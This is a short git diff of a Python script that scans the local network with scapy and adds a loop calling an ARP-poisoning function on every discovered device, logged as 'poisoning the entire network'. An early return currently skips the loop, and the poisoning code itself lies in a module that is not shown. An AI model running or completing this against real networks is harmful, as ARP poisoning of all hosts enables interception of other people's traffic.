@@ -10,16 +10,30 @@ from scapy.all import *
 from networkScanner import Scanner
 netScanner = Scanner()
 
+from logger import DataLogging
+logger = DataLogging(True)
+
+from ARPer import ARP
+arp = ARP()
 
 
 def main():
     # scan the network for all the devices on the network
-    print(f'scanning network')
+    logger.say(f'scanning network')
     IP = netScanner.getOwnIP()
     netMask = "24"
     type = 'ARP'
-    netScanner.scan(type, IP, netMask)
+    deviceList = netScanner.scan(type, IP, netMask)
 
+    logger.say(f'active devices: {deviceList}')
+
+    logger.say(f'poisoning the entire network')
+
+    return 1
+
+    for device in deviceList:
+        logger.say(f'poisoning {device}')
+        arp.ARP_poison(device, IP, True)
 
     return 1
 
